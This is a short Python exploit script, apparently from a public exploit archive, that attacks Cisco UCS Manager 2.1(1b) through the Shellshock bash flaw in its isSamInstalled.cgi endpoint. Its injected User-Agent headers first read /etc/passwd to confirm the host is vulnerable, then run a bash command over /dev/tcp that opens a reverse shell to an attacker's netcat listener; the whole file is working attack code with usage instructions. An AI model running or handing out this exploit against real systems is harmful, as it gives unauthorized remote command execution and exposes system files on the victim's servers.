#!/usr/bin/python
###############################################
# Cisco UCS Manager 2.1(1b) Shellshock Exploit
# 
# Exploit generates a reverse shell to a nc listener.
# Author: @thatchriseckert
###############################################

import httplib
import urllib
import sys
import requests
import time
 
if len(sys.argv) < 4:
	print "\n[*] Cisco UCS Manager 2.1(1b) Shellshock Exploit"
	print "[*] Usage: <Victim IP> <Attacking Host> <Reverse Shell Port>" 
	print "[*]"
	print "[*] Example: 127.0.0.1 127.0.0.1 4444"
	print "[*] Listener: nc -lvp <port>"
	print "\n"
	sys.exit()

requests.packages.urllib3.disable_warnings()
ucs = sys.argv[1]
url = "https://" + ucs + "/ucsm/isSamInstalled.cgi"
attackhost = sys.argv[2]
revshellport = sys.argv[3]
headers1 = {
		'User-Agent': '() { ignored;};/bin/bash -i >& /dev/tcp/' + attackhost + '/' + revshellport + ' 0>&1'
		}
headers2 = {
		"User-Agent": '() { test;};echo \"Content-type: text/plain\"; echo; echo; echo $(</etc/passwd)'
		}

def exploit():
	try:
		r = requests.get(url, headers=headers1, verify=False, timeout=5)
	except Exception, e:
		if 'timeout' in str(e):
			print "[+] Success.  Enjoy your shell..."
		else:
			print "[-] Something is wrong..."
			print "[-] Error: " + str(e)

def main():
	try:
		r = requests.get(url, headers=headers2, verify=False, timeout=3)
		if r.content.startswith('\nroot:'):
			print "[+] Host is vulnerable, spawning shell..."
			time.sleep(3)
			exploit()
		else:
			print "[-] Host is not vulnerable, quitting..."
			sys.exit()
	except Exception, e:
		print "[-] Something is wrong..."
		print "[-] Error: " + str(e)

if __name__ == "__main__":
	main()

